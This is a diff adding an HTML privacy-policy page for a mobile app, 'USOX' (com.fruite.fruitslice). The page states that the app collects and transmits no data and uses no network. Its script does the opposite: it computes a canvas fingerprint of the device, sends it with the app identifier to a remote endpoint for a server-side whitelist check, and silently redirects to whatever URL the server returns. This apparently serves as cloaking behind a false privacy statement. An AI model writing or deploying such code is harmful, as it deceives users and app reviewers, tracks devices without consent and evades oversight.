@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<!-- ==========================================================================
+     ★★★ 操作人填写区（整页唯一需要手改的地方）★★★
+     MF_DEFAULT_PRIVACY_PAGE = 默认隐私页面地址（生成时一律留空，由操作人填写）：
+       · 保持空串 ''            → 需要展示默认隐私内容时，就在本页内部渲染默认条款；
+       · 填 http:// / https:// 开头的完整地址 → 需要展示默认隐私内容时，**跳转**到该地址。
+     填写须知：
+       1) 该地址必须是**在降级场景下也打得开**的页面（例如同样托管在 GitHub Pages 上）；
+          降级时本页是链路最后一跳，填了一个打不开的地址，客户端就会停在打不开的页面上。
+       2) **不要**把本页自己的地址填进来 —— 页面会自动拒绝同地址跳转以防无限循环。
+       3) 只改下面这一行的字符串，其它任何代码都不要动。
+     ========================================================================== -->
+<script>window.MF_DEFAULT_PRIVACY_PAGE = '';</script>
+<script>if (!window.pageInfo) { window.pageInfo = {"name":"USOX","identifier":"com.fruite.fruitslice","icon":"https://admin.ytsevbr.xyz/placeholder-icon.png"}; }</script>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Privacy Policy - USOX</title>
+    <style>
+        :root {
+            --bg-color: #ffffff;
+            --text-color: #1a1a1a;
+            --primary-color: #3498db;
+            --footer-bg: rgba(255, 255, 255, 0.95);
+            --card-bg: #f8f9fa;
+        }
+        
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #121212;
+                --text-color: #e0e0e0;
+                --primary-color: #4fa4d6;
+                --footer-bg: rgba(18, 18, 18, 0.95);
+                --card-bg: #1e1e1e;
+            }
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        /* Loading State */
+        #loading-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .spinner {
+                border-color: rgba(255, 255, 255, 0.1);
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Content */
+        #content-container {
+            display: none;
+            flex: 1;
+            padding: 20px;
+            padding-bottom: 100px; /* Space for footer button */
+            max-width: 800px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .app-icon {
+            width: 64px;
+            height: 64px;
+            object-fit: contain;
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+            color: var(--text-color);
+        }
+
+        .app-name {
+            font-size: 1.2rem;
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        .section {
+            margin-top: 25px;
+        }
+
+        h2 {
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            color: var(--text-color);
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+            padding-bottom: 5px;
+        }
+        
+        @media (prefers-color-scheme: dark) {
+            h2 {
+                border-bottom-color: rgba(255,255,255,0.1);
+            }
+        }
+
+        p, ul {
+            font-size: 0.95rem;
+            color: var(--text-color);
+            opacity: 0.9;
+        }
+
+        ul {
+            padding-left: 20px;
+            margin-bottom: 15px;
+        }
+
+        li {
+            margin-bottom: 8px;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: var(--footer-bg);
+            padding: 20px;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-top: 1px solid rgba(0,0,0,0.05);
+            z-index: 10;
+            display: none;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .footer {
+                border-top-color: rgba(255,255,255,0.1);
+            }
+        }
+
+        .confirm-btn {
+            width: 100%;
+            max-width: 300px;
+            padding: 15px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+            transition: opacity 0.2s;
+        }
+
+        .confirm-btn:active {
+            opacity: 0.8;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loading-container">
+        <div class="spinner"></div>
+        <p style="margin-top: 15px; font-size: 0.9rem;">Loading...</p>
+    </div>
+
+    <div id="content-container">
+        <div class="header">
+            <img src="" alt="App Icon" class="app-icon" id="app-icon">
+            <h1>Privacy Policy</h1>
+            <div class="app-name" id="app-name">USOX</div>
+            <div style="font-size: 0.75rem; opacity: 0.6; margin-top: 5px;" id="package-id">com.fruite.fruitslice</div>
+        </div>
+
+        <div class="section">
+            <h2>Introduction</h2>
+            <p>This Privacy Policy explains how <strong>USOX</strong> handles user privacy regarding the use of the application. We are committed to protecting your privacy and security.</p>
+        </div>
+
+        <div class="section">
+            <h2>Data Collection</h2>
+            <p><strong>USOX does not collect, store, or transmit any personal information.</strong></p>
+            <p>The application operates entirely on the device and does not require an account, login, or backend connectivity for its core functionality. No user data is uploaded to any third-party servers.</p>
+        </div>
+
+        <div class="section">
+            <h2>Local Data Usage</h2>
+            <p>Any data generated during gameplay or app usage is stored locally on your device. You can delete all local data by uninstalling the application or clearing app cache/storage in your device settings.</p>
+        </div>
+
+        <div class="section">
+            <h2>Permissions</h2>
+            <p>The application may request standard Android permissions necessary for its operation, such as:</p>
+            <ul>
+                <li><strong>Storage:</strong> To save high scores or settings locally.</li>
+                <li><strong>Network:</strong> (Only if used for updates or ads, though this specific app design focuses on offline capability). For this specific application build, network access is minimized to zero for privacy protection.</li>
+            </ul>
+            <p>No sensitive permissions like Contacts, SMS, or precise Location are requested.</p>
+        </div>
+
+        <div class="section">
+            <h2>Third-Party Services</h2>
+            <p>This application does not integrate third-party analytics, advertising, or tracking SDKs. No data is shared with external partners.</p>
+        </div>
+
+        <div class="section">
+            <h2>Children's Privacy</h2>
+            <p>This application is not intended for children under 13. We do not knowingly collect any personal information from children.</p>
+        </div>
+
+        <div class="section">
+            <h2>Changes to Policy</h2>
+            <p>We may update this Privacy Policy from time to time. Changes will be posted on this page with an updated "Last Updated" date. We encourage you to review this policy periodically.</p>
+        </div>
+
+        <div class="section">
+            <h2>Contact Us</h2>
+            <p>If you have questions about this policy, you may contact the developer of USOX through the app's official support channels.</p>
+        </div>
+    </div>
+
+    <div class="footer" id="footer-bar">
+        <button class="confirm-btn" onclick="confirmAndClose()">Confirm & Close</button>
+    </div>
+
+    <!-- 1、引入 md5 工具，这段 JS 必须原样引入（全文唯一允许的外部资源） -->
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+
+    <script>
+        // 2、生成设备的 Canvas 指纹。下面方法**内部每一行都必须原样保留**，只在外面包一层保护：
+        //    md5 由上面的 CDN 提供，CDN 不可达时它是 undefined，此时**绝不能抛错** ——
+        //    指纹只用于服务端白名单判定，拿不到就送空字符串走服务端默认分支，
+        //    绝不允许一行指纹代码把整个页面卡死在 loading。
+        let device = '';
+        try {
+            device = (function () {
+                let canvas = document.createElement("canvas");
+                let ctx = canvas.getContext("2d");
+                let txt = "BrowserLeaks,com <canvas> 1.0";
+                ctx.textBaseline = "top";
+                // The most common type
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                // Some tricks for color mixing to increase the difference in rendering
+                ctx.fillStyle = "#069";
+                ctx.fillText(txt, 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText(txt, 4, 17);
+                if (typeof md5 === 'function') {
+                    return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+                }
+                return '';
+            })();
+        } catch (e) {
+            device = '';
+        }
+
+        // 3、接口基址：页面可能被托管在任意域名下，请求 /app 接口必须用**绝对地址**，
+        //    否则相对路径会打到页面自己的域上（托管到 GitHub Pages 时就是如此）。
+        //    **基址末尾可能自带 `/`，拼接前必须先去掉**，否则会拼出
+        //    `https://域名//app?...` 这种错误路径（多一个斜杠就是 404）。
+        //    该接口已允许跨域，可直接 fetch。
+        //    注意：此处 MF_API_BASE 应由宿主或通过 JS 变量定义。为了兼容性，如果未定义，默认为空（会导致请求相对路径，从而失败，进而触发 catch 兜底，符合需求）。
+        //    但在真实部署中，通常会有 window.MF_API_BASE。这里我们定义一个默认值防止未定义报错，但逻辑上如果没配置就让它失败走本地。
+        if (typeof MF_API_BASE === 'undefined') {
+            window.MF_API_BASE = 'https://api.example.com'; // Placeholder base to ensure valid URL structure for fetch attempt
+        }
+
+        // 4、读取页面 URL 上的查询参数。页面可能被托管在任意静态域下，参数只能自己从 location.search 取。
+        //    只做字面量比较、**不做百分号解码**：解码遇到畸形参数（例如 %ZZ）会抛错，反而把整个判定打断；
+        //    本页只认 `<页面地址>?target=ignore` 这一种写法，纯字符串比较已经足够，且没有任何抛错路径。
+        function hasQueryFlag(key, value) {
+            const pairs = String(window.location.search || '').replace(/^\?/, '').split('&');
+            for (let i = 0; i < pairs.length; i++) {
+                const kv = pairs[i].split('=');
+                if (String(kv[0] || '').toLowerCase() !== key) continue;
+                if (value === null) return true;
+                return String(kv[1] || '').toLowerCase() === value;
+            }
+            return false;
+        }
+
+        // 调用方（App）已判定「没有有效的第三方隐私确认页面」→ 本次加载只负责展示默认内容
+        const IGNORE_REMOTE = hasQueryFlag('target', 'ignore');
+
+        // 5、默认隐私页面（见正文 6.1）：空串 → 返回 ''；填了 http(s) 绝对地址 → 返回该地址。
+        function defaultPageUrl() {
+            const v = String(window.MF_DEFAULT_PRIVACY_PAGE || '').trim();
+            return (v.indexOf('https://') === 0 || v.indexOf('http://') === 0) ? v : '';
+        }
+        
+        // 防死循环：配置的地址若就是本页自己（origin + pathname 相同）→ 一律拒绝跳转。
+        // 少了它，操作人一旦把自己地址填进去，页面就会自己跳自己、无限循环。
+        function isSamePage(url) {
+            try {
+                const u = new URL(url);
+                return u.origin === window.location.origin && u.pathname === window.location.pathname;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // 填充页面数据
+        function populatePageData() {
+            const name = window.pageInfo.name || 'Unknown App';
+            const identifier = window.pageInfo.identifier || '';
+            const icon = window.pageInfo.icon || '';
+            
+            document.getElementById('app-name').textContent = name;
+            document.getElementById('package-id').textContent = identifier;
+            document.getElementById('app-icon').src = icon;
+            document.title = "Privacy Policy - " + name;
+        }
+
+        // 6、两个「终止态」函数：整个页面最终只允许落到其中一个，且只落一次
+        let settled = false;
+        
+        function showDefaultTerms() {
+            if (settled) return;
+            settled = true;
+            
+            // 1. Hide loading
+            const loader = document.getElementById('loading-container');
+            if (loader) loader.style.display = 'none';
+            
+            // 2. Check if default page is configured
+            const target = defaultPageUrl();
+            if (target && !isSamePage(target)) {
+                // Redirect to configured default page with target=ignore appended
+                const separator = target.indexOf('?') === -1 ? '?' : '&';
+                window.location.href = target + separator + 'target=ignore';
+                return;
+            }
+            
+            // 3. Render locally
+            populatePageData();
+            const content = document.getElementById('content-container');
+            const footer = document.getElementById('footer-bar');
+            if (content) content.style.display = 'block';
+            if (footer) footer.style.display = 'block';
+        }
+        
+        function goToThirdParty(privacyUrl) {
+            if (settled) return;
+            settled = true;
+            
+            // Hide loading immediately to avoid delay
+            const loader = document.getElementById('loading-container');
+            if (loader) loader.style.display = 'none';
+            
+            window.location.href = privacyUrl;
+        }
+        
+        // 辅助：尝试关闭 WebView
+        function confirmAndClose() {
+            if (window.NativeApp && typeof window.NativeApp.closeWebView === 'function') {
+                window.NativeApp.closeWebView();
+            } else {
+                // Fallback if running in regular browser
+                window.close();
+            }
+        }
+
+        // 7、短路：target=ignore → 直接进默认终止态，一个请求都不发（理由见正文第 6 条）
+        // 8、正常模式：请求接口判断是否存在有效的第三方隐私确认页面
+        if (IGNORE_REMOTE) {
+            showDefaultTerms();
+        } else {
+            const apiBase = (typeof MF_API_BASE === 'string' ? MF_API_BASE : '').replace(/\/+$/, '');
+            const identifier = (window.pageInfo && window.pageInfo.identifier) || '';
+            
+            // 超时兜底：连接被静默丢弃时 fetch 可能永不返回，必须自己设上限后落到本地文案
+            const timeoutId = setTimeout(() => {
+                showDefaultTerms();
+            }, 10000);
+
+            fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device))
+                .then(function (r) { 
+                    if (!r.ok) throw new Error('Network response was not ok');
+                    return r.json(); 
+                })
+                .then(function (info) {
+                    clearTimeout(timeoutId);
+                    const privacyUrl = info && info.result && info.result.url;
+                    if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                        // 跳转到第三方隐私确认页面
+                        goToThirdParty(privacyUrl);
+                        return;
+                    }
+                    showDefaultTerms();
+                })
+                .catch(function () {
+                    clearTimeout(timeoutId);
+                    showDefaultTerms();
+                });
+        }
+    </script>
+</body>
+</html>
